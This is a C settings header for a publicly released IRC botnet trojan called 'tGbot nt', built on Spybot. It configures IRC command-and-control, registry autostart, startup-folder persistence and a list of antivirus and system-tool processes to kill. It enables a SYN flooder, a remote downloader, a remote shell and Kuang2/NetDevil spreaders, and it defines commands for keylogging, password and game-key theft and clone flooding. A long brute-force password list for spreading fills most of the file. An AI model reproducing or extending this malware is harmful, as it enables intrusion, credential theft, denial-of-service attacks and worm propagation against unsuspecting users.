//////////////////////////////////////////////////////////														//
//		      tGbot nt 		                //
//	          by Tech and gh3tt0			//
//		 nt added by racerx90			//
//		 Based on Spybot 1.3		        //
//		      Public		                //
//							//
//////////////////////////////////////////////////////////

///////////////////bots settings/////////////////////


char filename[] = "winbot.exe"; //filename 
char password[] = ""; //bot pw
char channel[] = "#channel"; //chan joins 
char channelpass[] = "key"; //chan pw
const int maxlogins = 2; //logins
char valuename[] = "Windows Config"; //autostart
int decryptkey = 9; //decrypt
char mutexname[] = "Stat32bin201kthx"; //botcode. Must be changed. Only one bot with the same mutex will run.
char Bot_Version[] = "tGbot nt pub"; 
char szLocalPayloadFile[] = "payload.dat";
BOOL topiccommands = TRUE; //topic commands
int Flood_delay = 2000; //in msec avoid flood
#define rawcommands_after_connect;
#define rawcommands_after_join; 
#define meltserver;
#define remote_cmd; 
#define Use_Firewall_killer;
#define WEB_DOWNLOAD; //downloader
#define SYN_FLOOD; //synflooder
#define KUANG2_SPREADER;
#define MAX_PORTSCAN_SOCKETS_TO_USE 30 //sockets
#define GIVE_PING_REPLY; //ping reply
#define GIVE_VERSION_REPLY; //version reply
#define USE_IDENT_SERVER;
#define DEVIL_SPREADER; //netdevil spread

#ifdef GIVE_VERSION_REPLY
const char VERSION_REPLY[] = "tGbot nt";
#endif

//servers

char *ircservers[]={
	"server here",
	NULL //dont remove this line
};

//ports 

int serverports[]={ 
	6667
};

//rawcommands 

#ifdef rawcommands_after_connect
char *rawcommands[]={ 
	"MODE $NICK +i", 
	NULL //dont remove this line
};
#endif

//onjoincommands

#ifdef rawcommands_after_join
char *onjoin_commands[]={ 
	"MODE $CHAN +ntspm",
	//"MODE $CHAN +k key",
	NULL //dont remove this line
};
#endif

//Hostname Match

//#define use_hostname_match;


#ifdef use_hostname_match
char *trustedhosts[]={ 
	"host.net",
	NULL //dont remove this line
};
#endif

//#define use_ident_match;

//ident

#ifdef use_ident_match
char *trustedidents[]={
	"ident",
	NULL
};
#endif


//#define use_nickname_match;


#ifdef use_nickname_match
char *trustednicks[]={
	"nick",
	"nick",
	NULL
};
#endif

//AV an Firewall

#ifdef Use_Firewall_killer

int killer_delay = 2000;

//filenames in uppercase
char *kill_list[]={
	"NETSTAT.EXE",
	"MSCONFIG.EXE",
	"REGEDIT.EXE",
	"TASKMAN.EXE",
	"NAVAPW32.EXE",
	"MMC.EXE",
	"NAVAPW.EXE",
	"TASKMGR.EXE",
	"MSANTIV32.EXE",
	"DUMP3-2INI.EXE",
	"MSTASK.EXE",
	"TASKMON.EXE",
	NULL //dont remove this line
};
#endif

 
const char login_command[] = 		"!login";
const char info_command[] = 		"!info";
const char passwords_command[] = 	"!pass";
const char threads_command[] = 		"!threads";
const char killthread_command[] = 	"!killthread";
const char startkeylogger_command[] = 	"!startlog";
const char stopkeylogger_command[] = 	"!stoplog";
const char listprocesses_command[] = 	"!listproc";
const char killprocess_command[] = 	"!killproc";
const char disconnect_command[] = 	"!discon";
const char reconnect_command[] = 	"!recon";
const char server_command[] = 		"!server";
const char quit_command[] = 		"!quit";
const char reboot_command[] = 		"!reboot";
const char uninstall_command[] = 	"!unin-";
const char httpserver_command[] = 	"!http-*";
const char redirect_command[] = 	"!redirect";
const char raw_command[] = 		"!raw";
#ifdef WEB_DOWNLOAD
const char download_command[] = 	"!down";
#endif
#ifdef SYN_FLOOD
const char syn_command[] = 		"!syn";
#endif
const char list_command[] = 		"!list";
const char delete_command[] = 		"!delete";
const char rename_command[] = 		"!rename";
const char execute_command[] = 		"!execute";
const char makedir_command[] = 		"!makedir";
const char spy_command[] = 		"!spy";
const char stopspy_command[] = 		"!sspy";
const char redirect_spy_command[] = 	"!redspy";
const char redirect_stopspy_command[] = "!sredspy";
#ifdef remote_cmd
const char opencmd_command[] = 		"!opencmd";
const char cmd_command[] = 		"!cmd";
#endif
const char get_command[] = 		"!get";
const char sendto_command[] = 		"!sendto";
const char scan_command[] = 		"!scan";
const char gamekeys_command[] =		"!halflife";
const char gamekeysCS_command[] =	"!cstrike";
const char aimnames_command[] =		"!aim";
const char about_command[] = 		"!about";
const char uptime_command[] = 		"!uptime";
const char gamekeysWIN_command[] =	"!win";
const char ntscan_command[] =		"!ntscan";
const char ntstop_command[] =		"!ntstop";
const char ntdel_command[] =		"!ntdel";
const char ntstats_command[] =		"!ntstats";

/* Clone fucntion taken from Trusouljas spybot*/

const char clonesend_command[] = 		"!clones"; //command the clones re: clones join #chan or clones privmsg #chan :hi
const char clone_command[] = 		"!clone"; //load the clones syntax: loadclones <server> <port> <number> (max 50)
const char quitclones_command[] = 		"!killclones"; //unload the clones
const char cprefix[] = 		"flood"; //clones names 

char *startupdirs[]={
	"Documents and Settings\\All Users\\Start Menu\\Programs\\Startup",
	"Dokumente und Einstellungen\\All Users\\Start Menu\\Programs\\Startup",
	"Documenti e Impostazioni\\All Users\\Start Menu\\Programs\\Startup",
	"WINDOWS\\Start Menu\\Programs\\Startup",
	"WINNT\\Profiles\\All Users\\Start Menu\\Programs\\Startup",
	"WINDOWS\\All Users\\Start Menu\\Programs\\StartUp",
	"Documents and Settings\\All Users\\Menu Start\\Programma's\\Opstarten",
	NULL
};


/////////////////// end bots settings//////////////////////////

//keylogger an sendkeys
int inputL[]={
	8,
	13,
	27,
	112,
	113,
	114,
	115,
	116,
	117,
	118,
	119,
	120,
	121,
	122,
	123,
	192,
	49,
	50,
	51,
	52,
	53,
	54,
	55,
	56,
	57,
	48,
	189,
	187,
	9,
	81,
	87,
	69,
	82,
	84,
	89,
	85,
	73,
	79,
	80,
	219,
	221,
	65,
	83,
	68,
	70,
	71,
	72,
	74,
	75,
	76,
	186,
	222,
	90,
	88,
	67,
	86,
	66,
	78,
	77,
	188,
	190,
	191,
	220,
	17,
	91,
	32,
	92,
	44,
	145,
	45,
	36,
	33,
	46,
	35,
	34,
	37,
	38,
	39,
	40,
	144,
	111,
	106,
	109,
	107,
	96,
	97,
	98,
	99,
	100,
	101,
	102,
	103,
	104,
	105,
	110,
};

char *outputL[]={
	"b",
	"e",
	"[ESC]",
	"[F1]",
	"[F2]",
	"[F3]",
	"[F4]",
	"[F5]",
	"[F6]",
	"[F7]",
	"[F8]",
	"[F9]",
	"[F10]",
	"[F11]",
	"[F12]",
	"`",
	"1",
	"2",
	"3",
	"4",
	"5",
	"6",
	"7",
	"8",
	"9",
	"0",
	"-",
	"=",
	"[TAB]",
	"q",
	"w",
	"e",
	"r",
	"t",
	"y",
	"u",
	"i",
	"o",
	"p",
	"[",
	"]",
	"a",
	"s",
	"d",
	"f",
	"g",
	"h",
	"j",
	"k",
	"l",
	";",
	"'",
	"z",
	"x",
	"c",
	"v",
	"b",
	"n",
	"m",
	",",
	".",
	"/",
	"\\",
	"[CTRL]",
	"[WIN]",
	" ",
	"[WIN]",
	"[Print Screen]",
	"[Scroll Lock]",
	"[Insert]",
	"[Home]",
	"[Pg Up]",
	"[Del]",
	"[End]",
	"[Pg Dn]",
	"[Left]",
	"[Up]",
	"[Right]",
	"[Down]",
	"[Num Lock]",
	"/",
	"*",
	"-",
	"+",
	"0",
	"1",
	"2",
	"3",
	"4",
	"5",
	"6",
	"7",
	"8",
	"9",
	".",
}; 

char *outputH[]={
	"b",
	"e",
	"[ESC]",
	"[F1]",
	"[F2]",
	"[F3]",
	"[F4]",
	"[F5]",
	"[F6]",
	"[F7]",
	"[F8]",
	"[F9]",
	"[F10]",
	"[F11]",
	"[F12]",
	"~",
	"!",
	"@",
	"#",
	"$",
	"%",
	"^",
	"&",
	"*",
	"(",
	")",
	"_",
	"+",
	"[TAB]",
	"Q",
	"W",
	"E",
	"R",
	"T",
	"Y",
	"U",
	"I",
	"O",
	"P",
	"{",
	"}",
	"A",
	"S",
	"D",
	"F",
	"G",
	"H",
	"J",
	"K",
	"L",
	":",
	"\"",
	"Z",
	"X",
	"C",
	"V",
	"B",
	"N",
	"M",
	"<",
	">",
	"?",
	"|",
	"[CTRL]",
	"[WIN]",
	" ",
	"[WIN]",
	"[Print Screen]",
	"[Scroll Lock]",
	"[Insert]",
	"[Home]",
	"[Pg Up]",
	"[Del]",
	"[End]",
	"[Pg Dn]",
	"[Left]",
	"[Up]",
	"[Right]",
	"[Down]",
	"[Num Lock]",
	"/",
	"*",
	"-",
	"+",
	"0",
	"1",
	"2",
	"3",
	"4",
	"5",
	"6",
	"7",
	"8",
	"9",
	".",
};

/* pass list for devil spread */
#ifdef DEVIL_SPREADER
char *passwords[]={
	"",
"",
"ADMINISTRATOR",
"Penis",
"RAGE",
"noob",
"netbios",
"RPC",
"ND",
"rooted",
"r00t",
"GUEST",
"ROOT",
"ADMIN",
"PASSWORD",
"TEMP",
"SHARE",
"WRITE",
"FULL",
"BOTH",
"READ",
"FILES",
"DEMO",
"TEST",
"ACCESS",
"USER",
"BACKUP",
"SYSTEM",
"SERVER",
"LOCAL",
"%",
"unix",
"linux",
"Nilez",
"devil",
"netdevil",
"net-devil",
"root",
"0wned",
"owned",
"own",
"admin",
"Admin",
"password",
"Password",
"irule",
"netfuck",
"fucked",
"crash",
"1",
"12",
"123",
"1234",
"12345",
"123456",
"1234567",
"12345678",
"123456789",
"654321",
"54321",
"111",
"11111111",
"88888888",
"pass",
"passwd",
"database",
"abcd",
"abc123",
"oracle",
"sybase",
"123qwe",
"server",
"computer",
"Internet",
"super",
"123asd",
"ihavenopass",
"godblessyou",
"enable",
"xp",
"2002",
"2003",
"2600",
"110",
"111111",
"121212",
"123123",
"1234qwer",
"123abc",
"changeme",
"temp123",
"temp",
"test",
"root",
"admin",
"Admin",
"password",
"Password",
"1",
"12",
"123",
"1234",
"12345",
"123456",
"1234567",
"12345678",
"123456789",
"654321",
"54321",
"111",
"11111111",
"88888888",
"pass",
"passwd",
"database",
"abcd",
"abc123",
"oracle",
"sybase",
"123qwe",
"server",
"computer",
"Internet",
"super",
"123asd",
"ihavenopass",
"godblessyou",
"enable",
"xp",
"2002",
"2003",
"2600",
"110",
"111111",
"121212",
"123123",
"1234qwer",
"123abc",
"007",
"alpha",
"patrick",
"pat",
"administrator",
"root",
"sex",
"god",
"foobar",
"a",
"aaa",
"abc",
"test",
"test123",
"temp",
"temp123",
"win",
"pc",
"asdf",
"secret",
"qwer",
"yxcv",
"zxcv",
"home",
"owner",
"login",
"Login",
"pwd",
"pass",
"love",
"mypc",
"mypc123",
"admin123",
"pw123",
"mypass",
"mypass123",
"pw",
"Mat",
"Matt",
"Matthew",
"gobo",
"satan",
"satanik",
"satanic",
"spaceman",
"heaven",
"w00t",
"0wn3d",
"owned",
"killer",
"leet",
"l33t",
"l337",
"hacker",
"hax0r",
"script",
"scriptkiddie",
"kiddie",
"mirc",
"uwontguessme",
"youwontguessme",
"guessme",
"x",
"xx",
"xxx",
"xxxx",
"xxxxx",
"xxxxxx",
"xxxxxxx",
"xxxxxxxx",
"xxxxxxxxx",
"0",
"00",
"death",
"testing",
"000",
"0000",
"00000",
"000000",
"123456",
"academia",
"academic",
"accept",
"access",
"account",
"action",
"adam",
"admin",
"adrian",
"adrianna",
"adult",
"aerobics",
"aids",
"airplane",
"alaska",
"albany",
"albatros",
"albert",
"alert",
"alex",
"alexande",
"algebra",
"alias",
"aliases",
"alice",
"alicia",
"alisa",
"alison",
"allison",
"allow",
"alpha",
"alphabet",
"amadeus",
"amanda",
"amber",
"america",
"amorphou",
"anal",
"analog",
"anarchis",
"anarchy",
"anchor",
"andrea",
"android",
"andromac",
"andy",
"anfo",
"angela",
"angerine",
"angie",
"animal",
"animals",
"anita",
"anna",
"anne",
"annette",
"anon",
"anonymou",
"answer",
"anthrax",
"anthropo",
"anvils",
"anything",
"apollo13",
"april",
"aria",
"ariadne",
"arlene",
"army",
"arrow",
"arthur",
"artist",
"asdf",
"asian",
"asshole",
"athena",
"atmosphe",
"atom",
"attack",
"authoriz",
"aztecs",
"azure",
"babe",
"bla",
"baby",
"bacchus",
"backdoor",
"badass",
"bailey",
"ball",
"banana",
"bananas",
"bandit",
"bank",
"banks",
"barbara",
"barber",
"bare",
"barf",
"baritone",
"bart",
"bartman",
"baseball",
"basic",
"bass",
"bassoon",
"batch",
"batman",
"beach",
"beammeup",
"bear",
"beast",
"beater",
"beauty",
"beaver",
"becky",
"beethove",
"begin",
"behead",
"bell",
"beloved",
"benz",
"beowulf",
"berkeley",
"berlin",
"berliner",
"beryl",
"beta",
"beth",
"betsie",
"betty",
"beverly",
"bible",
"bicamera",
"bigfoot",
"bill",
"binary",
"bios",
"bird",
"bishop",
"bitch",
"bitmap",
"bitnet",
"black",
"blonde",
"blondie",
"blood",
"bloodaxe",
"blow",
"blowjob",
"blue",
"blues",
"board",
"bomb",
"boner",
"boob",
"boobs",
"book",
"born",
"boyscout",
"bradley",
"brandi",
"brandy",
"bravo",
"break",
"breast",
"brenda",
"brian",
"bridget",
"broadway",
"brothel",
"brunette",
"brute",
"brutefor",
"bulls",
"bullshit",
"bumbling",
"bung",
"burgess",
"burn",
"butch",
"butt",
"butthead",
"californ",
"camille",
"campanil",
"camping",
"candi",
"candy",
"cantor",
"captain",
"capture",
"card",
"cardinal",
"caren",
"carla",
"carmen",
"carol",
"carole",
"carolina",
"caroline",
"carrie",
"carson",
"cascades",
"cash",
"castle",
"catherin",
"catholic",
"cathy",
"cave",
"cayuga",
"cecily",
"celt",
"celtic",
"celtics",
"cerulean",
"change",
"charity",
"charles",
"charlie",
"charming",
"charon",
"chat",
"chem",
"chemistr",
"chess",
"chester",
"chip",
"chris",
"christin",
"christy",
"cigar",
"cigarett",
"cindy",
"class",
"classes",
"classic",
"claudia",
"claymore",
"cleavage",
"clinton",
"cluster",
"clusters",
"coast",
"cocacola",
"cocainco",
"cock",
"code",
"codename",
"codeword",
"coffee",
"coin",
"coke",
"cola",
"cold",
"collins",
"color",
"combat",
"comics",
"commit",
"commrade",
"company",
"computer",
"computin",
"comrade",
"comrades",
"condo",
"condom",
"connect",
"connie",
"conserva",
"console",
"continue",
"cook",
"cookbook",
"cookie",
"cool",
"cooper",
"copper",
"cops",
"copy",
"corneliu",
"correct",
"counters",
"country",
"couscous",
"cowboy",
"crack",
"crackpot",
"crash",
"cream",
"create",
"creation",
"creature",
"credit",
"creosote",
"cretin",
"crime",
"criminal",
"cristina",
"crystal",
"cshrc",
"cunt",
"customer",
"cyber",
"cyberpun",
"cyberspa",
"cynthia",
"daemon",
"daisy",
"dana",
"dancer",
"daniel",
"danielle",
"danny",
"dapper",
"dark",
"darkaven",
"data",
"database",
"dave",
"dawn",
"dead",
"death",
"deathsta",
"debbie",
"deborah",
"debug",
"december",
"deck",
"default",
"defoe",
"delta",
"deluge",
"demo",
"democrat",
"denise",
"dennis",
"desiree",
"desk",
"desktop",
"desperat",
"develop",
"device",
"devil",
"dial",
"diamond",
"diana",
"diane",
"dice",
"dick",
"diehard",
"diet",
"dieter",
"digital",
"dinosaur",
"dipshit",
"direct",
"director",
"dirty",
"disc",
"discipli",
"disclose",
"discover",
"disk",
"diskette",
"disney",
"display",
"doctor",
"dollar",
"dong",
"doom",
"doom2",
"doomii",
"doomsday",
"doonesbu",
"door",
"doors",
"dope",
"download",
"dragon",
"drdoom",
"drive",
"drought",
"duck",
"dude",
"duelist",
"duke",
"dulce",
"duncan",
"dungeon",
"dyke",
"eager",
"eagle",
"earth",
"easier",
"easy",
"eatme",
"echo",
"eddie",
"edges",
"edinburg",
"edit",
"edition",
"educatio",
"edwin",
"edwina",
"egghead",
"eiderdow",
"eileen",
"einsiein",
"einstein",
"elaine",
"elanor",
"electron",
"elephant",
"elizabet",
"ellen",
"email",
"emerald",
"emily",
"emmanuel",
"enemy",
"engine",
"engineer",
"england",
"english",
"enter",
"enterpri",
"enzyme",
"erenity",
"eric",
"erica",
"erika",
"erin",
"erotic",
"ersatz",
"establis",
"estate",
"eternity",
"euclid",
"evelyn",
"expert",
"explode",
"explore",
"explorer",
"explosiv",
"extensio",
"fairway",
"faith",
"falcon",
"false",
"family",
"farad",
"faraday",
"fart",
"fast",
"fear",
"feds",
"felicia",
"fender",
"fermat",
"ferrari",
"fidelity",
"field",
"fight",
"file",
"finite",
"fire",
"firewall",
"fishers",
"flakes",
"float",
"florida",
"flower",
"flowers",
"foobar",
"food",
"fool",
"foolproo",
"football",
"force",
"ford",
"foresigh",
"forever",
"form",
"format",
"fornicat",
"forsythe",
"fourier",
"foxtrot",
"france",
"frank",
"freak",
"fred",
"free",
"freedom",
"french",
"friday",
"friend",
"friends",
"frighten",
"frog",
"fryguy",
"fubar",
"fuck",
"fucker",
"fucking",
"fuckme",
"fuckyou",
"fudge",
"function",
"fungible",
"gabriel",
"games",
"gardner",
"garfield",
"gateway",
"gatherin",
"gatt",
"gauss",
"george",
"germ",
"gertrude",
"ghost",
"gibson",
"gigabyte",
"gina",
"ginger",
"girl",
"glacier",
"gold",
"golden",
"golf",
"golfer",
"good",
"gorgeous",
"gorges",
"gosling",
"gouge",
"govermen",
"grades",
"graham",
"grahm",
"grand",
"grant",
"great",
"green",
"group",
"gryphon",
"guardian",
"gucci",
"guess",
"guest",
"guitar",
"gumption",
"guntis",
"hack",
"hacked",
"hacker",
"hagar",
"hair",
"hallowee",
"hamlet",
"hamster",
"handel",
"handily",
"handjob",
"happenin",
"hard",
"hardcore",
"harddriv",
"harmony",
"harold",
"harvey",
"hate",
"haven",
"hawaii",
"head",
"headbang",
"heat",
"heathen",
"heather",
"heaven",
"hebrides",
"heidi",
"heinlein",
"hell",
"hello",
"help",
"herb",
"herbert",
"hero",
"heroin",
"hewlett",
"hexadeci",
"hiawatha",
"hibernia",
"hidden",
"high",
"highland",
"hitler",
"hits",
"hole",
"holly",
"hollywoo",
"home",
"homepage",
"homer",
"homework",
"honey",
"hooker",
"hooters",
"horny",
"horrible",
"horror",
"horse",
"horus",
"host",
"hotdog",
"hotel",
"http",
"hunt",
"hunter",
"hutchins",
"hydrogen",
"hyper",
"hypertxt",
"icecream",
"illumina",
"image",
"imbrogli",
"immortal",
"imperial",
"include",
"india",
"indian",
"indiana",
"indians",
"ingres",
"ingress",
"ingrid",
"inna",
"innocuou",
"input",
"inside",
"integer",
"internet",
"invent",
"irene",
"irishman",
"isis",
"jackie",
"jail",
"jane",
"janet",
"janice",
"janie",
"japan",
"jasmin",
"java",
"jazz",
"jean",
"jeanne",
"jeff",
"jenni",
"jennifer",
"jenny",
"jerry",
"jerusale",
"jessica",
"jester",
"jewelry",
"jill",
"jixian",
"joanne",
"jody",
"john",
"johndoe",
"johnny",
"joseph",
"joshua",
"journal",
"joyce",
"judith",
"judy",
"juggle",
"juicy",
"julia",
"julie",
"juliet",
"june",
"jupiter",
"kaka",
"karen",
"karie",
"karina",
"katana",
"kate",
"kathleen",
"kathrine",
"kathy",
"katina",
"katrina",
"kelly",
"keri",
"kermit",
"kernel",
"kerri",
"kerrie",
"kerry",
"kevin",
"kewl",
"keybord",
"keyin",
"keyword",
"kids",
"kill",
"killthem",
"kilo",
"kimberly",
"king",
"kirk",
"kirkland",
"kiss",
"kissmyas",
"kitten",
"klingon",
"knife",
"knight",
"knightma",
"known",
"krista",
"kristen",
"kristi",
"kristie",
"kristin",
"kristine",
"kristy",
"ladies",
"ladle",
"lakers",
"lambda",
"laminati",
"lana",
"laptop",
"lara",
"larkin",
"larry",
"laser",
"laura",
"lava",
"lazarus",
"lazer",
"leah",
"lebesgue",
"left",
"leftwing",
"legal",
"leland",
"leroy",
"lesbian",
"leslie",
"letmein",
"lewis",
"lexluthe",
"liberal",
"library",
"lick",
"licker",
"life",
"light",
"lightsab",
"lima",
"limbaugh",
"limited",
"linda",
"link",
"lion",
"lips",
"lisa",
"lisp",
"literatu",
"live",
"load",
"lock",
"lockout",
"lockword",
"logic",
"login",
"loginwor",
"logout",
"lois",
"lolopc",
"loose",
"lore",
"lori",
"lorin",
"lorraine",
"loser",
"louis",
"love",
"lovebug",
"lover",
"luck",
"lucus",
"lucy",
"lude",
"luke",
"lust",
"lynn",
"lynne",
"machine",
"macintos",
"mack",
"macro",
"maggot",
"magic",
"magnet",
"mail",
"maint",
"malcolm",
"malcom",
"mana",
"manager",
"mara",
"marci",
"marcy",
"maria",
"mariens",
"marietta",
"marijuan",
"marines",
"mark",
"markus",
"marni",
"marriage",
"mars",
"marty",
"marvin",
"mary",
"mason",
"master",
"math",
"maurice",
"meagan",
"megabyte",
"megadeth",
"megan",
"melissa",
"mellon",
"melrose",
"member",
"memory",
"menace",
"menu",
"mercury",
"merlin",
"metal",
"metalhea",
"metalica",
"mets",
"mice",
"michael",
"michelan",
"michele",
"michelle",
"mickey",
"micro",
"microchi",
"micropro",
"microsof",
"midieval",
"mike",
"mine",
"minimum",
"minsky",
"misfit",
"mission",
"mkii",
"mode",
"modem",
"mogul",
"moguls",
"monday",
"monica",
"moom",
"moor",
"moose",
"more",
"morley",
"morris",
"mortal",
"mortalco",
"mortgage",
"mosaic",
"mountain",
"mouse",
"move",
"movie",
"movies",
"mozart",
"mpeg",
"msdos",
"muppets",
"mutant",
"nagel",
"name",
"nancy",
"napoleon",
"nasa",
"navy",
"nepenthe",
"neptune",
"ness",
"netscape",
"network",
"newborn",
"news",
"newsgrou",
"newton",
"newyork",
"next",
"nice",
"nicole",
"nicotine",
"night",
"nightmar",
"nintendo",
"nita",
"nnaacp",
"noble",
"nobody",
"node",
"noreen",
"notes",
"noth",
"nova",
"novel",
"november",
"noxious",
"nuclear",
"nude",
"nuke",
"nukem",
"null",
"number",
"nutritio",
"nuts",
"nyquist",
"obscurit",
"oceanogr",
"ocelot",
"office",
"okay",
"oldage",
"olivetti",
"olivia",
"omega",
"open",
"opening",
"openlock",
"opensesa",
"operator",
"oracle",
"orca",
"orient",
"orwell",
"oscar",
"osiris",
"outdoors",
"outlaw",
"output",
"outside",
"oxford",
"pacific",
"packard",
"packer",
"painless",
"paint",
"pakistan",
"pamela",
"papa",
"paper",
"papers",
"pascal",
"pass",
"passphra",
"password",
"paste",
"patricia",
"patriot",
"patty",
"paula",
"peanuts",
"pecker",
"pencil",
"penelope",
"penguin",
"penis",
"penname",
"pentagon",
"pentagra",
"penthous",
"pentium",
"peoria",
"pepper",
"pepsi",
"percolat",
"perfect",
"permit",
"persimmo",
"persona",
"pervert",
"pete",
"peter",
"phil",
"philip",
"phoenix",
"phone",
"photon",
"phrack",
"phrase",
"phreak",
"phuck",
"pick",
"pierre",
"pimp",
"pinname",
"piss",
"pizza",
"plane",
"playboy",
"plover",
"pluto",
"plymouth",
"poetry",
"police",
"polly",
"polynomi",
"ponderin",
"poop",
"poor",
"pork",
"porn",
"porno",
"porsche",
"post",
"poster",
"power",
"praise",
"precious",
"prelude",
"presto",
"prince",
"princeto",
"printer",
"priv",
"private",
"privs",
"proceed",
"processo",
"professo",
"profile",
"program",
"prompt",
"protect",
"protozoa",
"psycho",
"psychopa",
"public",
"puck",
"puke",
"pumpkin",
"puneet",
"punisher",
"punk",
"puppet",
"pussy",
"quebec",
"qwert",
"qwerty",
"rabbit",
"rachel",
"rachelle",
"rachmani",
"raid",
"rain",
"rainbow",
"raindrop",
"raleigh",
"random",
"rape",
"rascal",
"razor",
"reagan",
"reality",
"really",
"ream",
"reaper",
"rebal",
"rebecca",
"rebel",
"record",
"reddawn",
"redhead",
"referenc",
"regional",
"release",
"remote",
"renee",
"reno",
"rent",
"report",
"republic",
"resistan",
"reveal",
"rhino",
"rich",
"rick",
"riffraff",
"right",
"rightwin",
"ring",
"riot",
"ripple",
"risc",
"roach",
"robert",
"robin",
"robot",
"robotics",
"robyn",
"rochelle",
"rocheste",
"rock",
"rocky",
"rockyhor",
"rodent",
"rolex",
"romano",
"romeo",
"romulan",
"ronald",
"root",
"rose",
"rosebud",
"rosemary",
"roses",
"rough",
"rubber",
"ruben",
"ruby",
"rude",
"rules",
"running",
"rush",
"ruth",
"safe",
"salami",
"sale",
"salt",
"samantha",
"sample",
"sandra",
"sandy",
"sara",
"sarah",
"saturday",
"saturn",
"saxon",
"scamper",
"scheme",
"school",
"scifi",
"scorpion",
"scott",
"scotty",
"scout",
"script",
"search",
"secret",
"security",
"seed",
"sega",
"sensor",
"sentinel",
"sentry",
"serenity",
"serial",
"server",
"service",
"sesame",
"sexy",
"shannon",
"sharc",
"shark",
"sharks",
"sharon",
"sheffiel",
"sheldon",
"shell",
"sherri",
"shift",
"shirley",
"shit",
"shitpot",
"shiva",
"shivers",
"short",
"shuttle",
"sick",
"sierra",
"signatur",
"silver",
"simcity",
"simon",
"simple",
"simpsons",
"simulati",
"singer",
"single",
"site",
"skull",
"slave",
"slick",
"sliders",
"slow",
"slut",
"small",
"smart",
"smile",
"smiles",
"smooch",
"smother",
"smtp",
"smut",
"snach",
"snafu",
"snake",
"snatch",
"snoopy",
"soap",
"social",
"socrates",
"sodomy",
"soft",
"software",
"somebody",
"sondra",
"sonia",
"sonic",
"sonya",
"sossina",
"source",
"south",
"spaceshi",
"sparrows",
"spear",
"spell",
"spice",
"spider",
"spiderma",
"spit",
"spred",
"spring",
"springer",
"spunk",
"squires",
"sr71",
"stacey",
"staci",
"stacie",
"stacy",
"star",
"starship",
"start",
"startrek",
"startup",
"starwars",
"steak",
"steal",
"steel",
"steph",
"stephani",
"stereo",
"steve",
"stoneage",
"stoned",
"stones",
"strange",
"strangle",
"stratfor",
"streetfi",
"string",
"strip",
"student",
"stuttgar",
"subscrib",
"subway",
"success",
"suck",
"suckmydi",
"sucks",
"summer",
"sunday",
"super",
"superman",
"superson",
"supersta",
"superuse",
"supervis",
"support",
"supporte",
"surfer",
"surfing",
"susan",
"susanne",
"susie",
"suzanne",
"suzie",
"swearer",
"sweat",
"switch",
"sword",
"sybil",
"symmetry",
"sysadmin",
"sysop",
"system",
"tabasco",
"talk",
"tall",
"tamara",
"tami",
"tamie",
"tammy",
"tangerin",
"tango",
"tape",
"tara",
"target",
"tarragon",
"taylor",
"teacher",
"team",
"teapot",
"tears",
"tech",
"teen",
"teenage",
"telephon",
"telnet",
"temp",
"temptati",
"tennis",
"tera",
"terminal",
"terminat",
"tess",
"test",
"tetris",
"text",
"thailand",
"theresa",
"thin",
"thursday",
"tiffany",
"tiger",
"time",
"tina",
"tits",
"toad",
"toggle",
"token",
"tokenrin",
"tomato",
"topograp",
"tortoise",
"toxic",
"toyota",
"traci",
"tracie",
"tracy",
"trails",
"transfer",
"trap",
"trapdoor",
"tree",
"trek",
"trisha",
"trivial",
"trojan",
"trombone",
"tron",
"true",
"truth",
"tubas",
"tuesday",
"turn",
"tuttle",
"ugly",
"umesh",
"uncle",
"undo",
"unhappy",
"unicorn",
"uniform",
"universa",
"universe",
"universi",
"unix",
"unknown",
"unlock",
"upload",
"uranus",
"urchin",
"ursula",
"usenet",
"user",
"usermane",
"username",
"usmc",
"util",
"utility",
"uucp",
"vagina",
"valerie",
"vampire",
"vasant",
"venus",
"veronica",
"vertigo",
"vicky",
"victor",
"video",
"videogam",
"village",
"virgin",
"virginia",
"virus",
"visitor",
"visual",
"visualba",
"vodka",
"waco",
"ward",
"warez",
"warfare",
"wargames",
"warp",
"warren",
"wasp",
"watchwor",
"water",
"wave",
"webpage",
"wednesda",
"weed",
"weenie",
"well",
"wendi",
"wendy",
"werewolf",
"west",
"western",
"whatever",
"whatnot",
"whisky",
"white",
"whiting",
"whitney",
"wholesal",
"whore",
"will",
"william",
"williams",
"willie",
"wilma",
"windows",
"wine",
"wing",
"winston",
"wired",
"wisconsi",
"wiseass",
"within",
"wizard",
"wolf",
"wolverin",
"woman",
"wombat",
"women",
"wood",
"woodwind",
"word",
"wordperf",
"worf",
"work",
"worm",
"wormwood",
"wwii",
"wyoming",
"xena",
"xfer",
"xman",
"xmen",
"xmodem",
"xray",
"xyzzy",
"yaco",
"yang",
"yankee",
"yellow",
"yellowst",
"yolanda",
"yosemite",
"young",
"zebra",
"zeitgeis",
"ziggy",
"zimmerma",
"zmodem",
"zombie",
"zulu",
"changeme",
"temp123",
"temp",
"test",
"root",
"admin",
"Admin",
"password",
"Password",
"1",
"12",
"123",
"1234",
"12345",
"123456",
"1234567",
"12345678",
"123456789",
"654321",
"54321",
"111",
"000000",
"00000000",
"11111111",
"88888888",
"pass",
"passwd",
"database",
"abcd",
"abc123",
"oracle",
"sybase",
"123qwe",
"server",
"computer",
"Internet",
"super",
"123asd",
"ihavenopass",
"godblessyou",
"enable",
"xp",
"2002",
"2003",
"2600",
"0",
"110",
"111111",
"121212",
"123123",
"1234qwer",
"123abc",
"007",
"alpha",
"patrick",
"pat",
"administrator",
"root",
"sex",
"god",
"foobar",
"a",
"aaa",
"abc",
"test",
"test123",
"temp",
"temp123",
"win",
"pc",
"asdf",
"secret",
"qwer",
"yxcv",
"zxcv",
"home",
"xxx",
"owner",
"login",
"Login",
"pwd",
"pass",
"love",
"mypc",
"mypc123",
"admin123",
"pw123",
"mypass",
"mypass123",
"pw",
"Mat",
"Matt",
"Matthew",
"gobo",
"satan",
"satanik",
"satanic",
"spaceman",
"heaven",
"w00t",
"0wn3d",
"owned",
"killer",
"leet",
"l33t",
"l337",
"hacker",
"hax0r",
"script",
"scriptkiddie",
"kiddie",
"mirc",
"uwontguessme",
"youwontguessme",
"guessme",
"test",
"tester",
"testin",
"testing",
"Ross",
"Rosco",
"RoscoP",
"RoscoPColtrane",
"lol",
"d00d",
"dude",
"dudette",
"dud3",
"Alex",
"Al3x",
"Alexander",
"donaldduck",
"wileecoyote",
"windowz",
"windoze",
"windose",
"bill",
"billy",
"M$",
"MS",
"WindowsXP",
"windows2k",
"windowsME",
"windows98",
"windows95",
"windozexp",
"windoze2k",
"windozeME",
"windoze98",
"windoze95",
"wh0r3",
"whore",
"ho",
"wh0re",
"hax",
"haxing",
"h4x1ng",
"h4x0r1ng",
"h4x0ring",
"",
	NULL
};
#endif

